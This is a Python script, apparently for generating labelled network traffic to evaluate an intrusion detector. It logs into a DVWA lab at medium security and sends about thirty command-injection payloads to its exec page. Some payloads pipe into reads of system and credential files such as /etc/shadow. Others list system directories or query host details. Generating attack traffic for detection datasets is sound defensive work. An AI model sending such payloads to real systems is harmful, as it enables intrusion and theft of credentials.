import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS COMMAND INJECTION EVALUACION MEDIUM
# DISTINTOS a evaluacion_exec.py (low) Y
# DISTINTOS a entrenamiento_exec_medium.py (medium)
# =============================================

PAYLOADS_EXEC_EVAL_MEDIUM = [
    # Pipe con comandos distintos al entrenamiento
    "127.0.0.1 | cat /etc/group",
    "127.0.0.1 | cat /etc/shadow",
    "127.0.0.1 | cat /etc/crontab",
    "127.0.0.1 | cat /etc/fstab",
    "127.0.0.1 | cat /etc/resolv.conf",
    "127.0.0.1 | cat /etc/nsswitch.conf",
    "127.0.0.1 | cat /proc/net/tcp",
    "127.0.0.1 | cat /proc/net/udp",
    "127.0.0.1 | cat /proc/net/arp",
    "127.0.0.1 | cat /proc/sys/kernel/hostname",
    # Pipe con listados distintos
    "127.0.0.1 | ls /bin",
    "127.0.0.1 | ls /sbin",
    "127.0.0.1 | ls /usr/bin",
    "127.0.0.1 | ls /usr/sbin",
    "127.0.0.1 | ls /usr/local",
    "127.0.0.1 | ls /opt",
    "127.0.0.1 | ls /srv",
    "127.0.0.1 | ls /media",
    # Pipe con informacion distinta
    "127.0.0.1 | hostname -f",
    "127.0.0.1 | hostname -i",
    "127.0.0.1 | domainname",
    "127.0.0.1 | dnsdomainname",
    "127.0.0.1 | lsb_release -a",
    "127.0.0.1 | lscpu",
    "127.0.0.1 | lsblk",
    "127.0.0.1 | lsusb",
    "127.0.0.1 | lspci",
    # Double pipe distintos
    "127.0.0.1 || cat /etc/group",
    "127.0.0.1 || hostname",
    "127.0.0.1 || lscpu",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_exec_eval_medium(session):
    print("\n[*] Iniciando ataques Command Injection MEDIUM (evaluacion)...")
    payloads = PAYLOADS_EXEC_EVAL_MEDIUM.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.post(f"{BASE_URL}/vulnerabilities/exec/",
                             data={"ip": payload, "Submit": "Submit"})
            print(f"  EXEC_EVAL_M | {payload[:45]:<45} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] Command Injection Medium evaluacion completado: {ok}/{len(payloads)} peticiones")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  EVALUACION: COMMAND INJECTION — NIVEL MEDIUM")
    print("  Etiqueta real: 'exec'")
    print("  !! NO subir el pcap a Elasticsearch !!")
    print("  Guardarlo como: evaluacion_exec_medium.pcap")
    print("  AVISO: Asegurate de que DVWA esta en nivel MEDIUM")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_exec_eval_medium(session)

    print("\n" + "="*60)
    print("  COMPLETADO. Guarda el pcap como: evaluacion_exec_medium.pcap")
    print("="*60)
